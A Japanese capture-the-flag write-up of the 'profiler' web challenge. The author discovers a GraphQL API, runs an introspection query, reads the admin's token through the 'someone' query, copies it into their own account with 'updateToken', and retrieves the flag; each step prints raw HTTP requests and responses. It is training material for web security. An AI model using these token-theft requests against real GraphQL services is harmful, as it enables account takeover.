# profiler
```
Let's edit your profile with profiler!
Hint: You don't need to deobfuscate *.js
Notice: Server is periodically initialized.
```

<br>

## Solution

![1](https://user-images.githubusercontent.com/47602064/83003339-227e9800-a049-11ea-9501-46564af5aa98.png)

問題のurlに移動するとアカウントの登録とログインのページに移動しました。

今回はソースコードは公開されていません。

試しに適当にアカウントを作成してみます。

![1](https://user-images.githubusercontent.com/47602064/83255145-dd926700-a1ea-11ea-8169-fb1962bac20d.png)

すると以上のように表示がされて自分のtokenが与えられました。

`Your token is 9646a00a78713456c4ce7eb55acd41104ba7e26742b3d2345108268e26e56c64.`

<br>

アカウントが作成できたようなのでこれでログインしてみます。

すると以下のようにログインできました。

![2](https://user-images.githubusercontent.com/47602064/83255345-35c96900-a1eb-11ea-8b91-cb8096d8efc6.png)

下の方にある`Get FLAG`のボタンを試しに押してみると以下のようにコメントされて`admin`の権限での操作が必要そうです。

`Sorry, your token is not administrator's one. This page is only for administrator(uid: admin).`

<br>

次にプロフィールを変更してみます。

適当にprofileを入力して先程のtokenを使ってみます。

![3](https://user-images.githubusercontent.com/47602064/83255449-6a3d2500-a1eb-11ea-9822-7c7b1df90391.png)

するとupdateが出来たそうです。

このupdateのrequestとresponseは以下の内容になっていました。

```http
POST /api HTTP/1.1
Host: profiler.quals.beginners.seccon.jp

{"query":"mutation {\n    updateProfile(profile: \"test3\", token: \"9646a00a78713456c4ce7eb55acd41104ba7e26742b3d2345108268e26e56c64\")\n  }"}
```

```http
HTTP/1.1 200 OK

{"data":{"updateProfile":true}}
```

`profile`の`update`は`/api`に`POST`されていることがわかります。

ネットで`aip query mutation`と調べると`GraphQL API`というのが出てきました。

さらにそこから色々調べてみるとそれでやりとりをしていることがわかりました。

<br>

次にどういった定義がされているのかが知れる方法をネットで調べてみると`Introspection`というのが見つかりました。

これはスキーマ定義を取得してくれるそうです。

他にも色々調べながら試してみたら、以下のように送信してみると上手く返ってきました。

```http
POST /api HTTP/1.1
Host: profiler.quals.beginners.seccon.jp

{"query":"query {__schema {types {name fields {name}}}}"}
```

このrequestはGraphQL API エンドポイントに対し、利用可能な API は何か？を問い合わせるのに利用できるそうです。

　　　参照：https://graphql.org/learn/introspection/

```http
HTTP/1.1 200 OK

{"data":{"__schema":{"types":[{"fields":[{"name":"me"},{"name":"someone"},{"name":"flag"}],"name":"Query"},{"fields":[{"name":"uid"},{"name":"name"},{"name":"profile"},{"name":"token"}],"name":"User"},{"fields":null,"name":"ID"},{"fields":null,"name":"String"},{"fields":[{"name":"updateProfile"},{"name":"updateToken"}],"name":"Mutation"},{"fields":null,"name":"Boolean"},{"fields":[{"name":"types"},{"name":"queryType"},{"name":"mutationType"},{"name":"subscriptionType"},{"name":"directives"}],"name":"__Schema"},{"fields":[{"name":"kind"},{"name":"name"},{"name":"description"},{"name":"fields"},{"name":"interfaces"},{"name":"possibleTypes"},{"name":"enumValues"},{"name":"inputFields"},{"name":"ofType"}],"name":"__Type"},{"fields":null,"name":"__TypeKind"},{"fields":[{"name":"name"},{"name":"description"},{"name":"args"},{"name":"type"},{"name":"isDeprecated"},{"name":"deprecationReason"}],"name":"__Field"},{"fields":[{"name":"name"},{"name":"description"},{"name":"type"},{"name":"defaultValue"}],"name":"__InputValue"},{"fields":[{"name":"name"},{"name":"description"},{"name":"isDeprecated"},{"name":"deprecationReason"}],"name":"__EnumValue"},{"fields":[{"name":"name"},{"name":"description"},{"name":"locations"},{"name":"args"}],"name":"__Directive"},{"fields":null,"name":"__DirectiveLocation"}]}}}
```

見てみると`schema`と`types`などを得ることが出来ました。

その中に`flag`というクエリがあるので最終的にこれが使えそうと思われます。

どのクエリがどういった機能があるか知らないのでユーザ系の情報を取得してくれるのをネットで探しました。

すると`someone`はユーザの情報を取得してくれて、`updateToken`はユーザの`token`を更新してくれるそうです。

なのでこの2つを使ってみます。

ちなみに`Introspection`や`GraphQL Playground`というツールでもっと上手く得ることができるそうです。

<br>

まずは`admin`の`token`を取得するために`someone`を使って送ってみます。

```http
POST /api HTTP/1.1
Host: profiler.quals.beginners.seccon.jp

{"query":"query{someone(uid: \"admin\"){token}}"}
```

```http
HTTP/1.1 200 OK

{"data":{"someone":{"token":"743fb96c5d6b65df30c25cefdab6758d7e1291a80434e0cdbb157363e1216a5b"}}}
```

これで`admin`の`token`を得ることが出来ました。

<br>

次はこの`token`を自分の`token`に変更するように`updateToken`を使って送ってみます。

```http
POST /api HTTP/1.1
Host: profiler.quals.beginners.seccon.jp

{"query":"mutation {updateToken(token: \"743fb96c5d6b65df30c25cefdab6758d7e1291a80434e0cdbb157363e1216a5b\")}"}
```

```http
HTTP/1.1 200 OK

{"data":{"updateToken":true}}
```
これで自分の`token`に`admin`の`token`に変更が出来たと思います。

<br><br>

なので初めの方に出てきた`flag`のクエリを使って表示できるか、以下のように送ってみます。

すると上手くflagを表示させることが出来ました。

```http
POST /api HTTP/1.1
Host: profiler.quals.beginners.seccon.jp

{"query":"query {flag}"}
```

```http
HTTP/1.1 200 OK

{"data":{"flag":"ctf4b{plz_d0_n07_4cc3p7_1n7r05p3c710n_qu3ry}"}}
```

<br><br>

## FLAG: ctf4b{plz_d0_n07_4cc3p7_1n7r05p3c710n_qu3ry}
